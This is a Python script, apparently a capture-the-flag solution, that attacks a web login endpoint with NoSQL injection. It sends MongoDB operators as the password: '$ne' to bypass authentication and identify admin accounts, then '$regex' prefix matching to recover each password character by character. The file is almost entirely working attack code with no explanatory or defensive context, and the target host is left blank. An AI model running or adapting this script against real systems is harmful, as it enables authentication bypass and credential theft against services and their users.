import requests
import re
import string

host = ""
uid = ["guest", "hack", "apple", "melon", "testuser", "admin", "aaaa", "cream", "berry", "ice", "panda"]
result = []
headers = {"Content-Type":"application/json"}

for _ in range(len(uid)):
    print(f"Testing {uid[_]}...")
    data = {"uid":f"{uid[_]}","upw":{"$ne":"a"}}
    req = requests.post(host, json=data, headers=headers)

    match = re.search(r"Your admin auth:\s*(\w+)", req.text)
    res = match.group(1)

    if "1" in res:
        result.append(uid[_])

wordlist = string.ascii_letters + string.digits + "{" + "}"
rest = ""

for user in result:
    pw = ""
    print(f"[*] start {user}")
    while True:
        for _ in wordlist:
            data = {"uid":f"{user}", "upw":{"$regex":f"^{pw}{_}.*$"}}
            req = requests.post(host, headers=headers, json=data)
            if f"Your admin auth:" in req.text:
                rest += _
                pw += _
                print(f"[+] {rest}")
                break

        if _ == "}":
            break
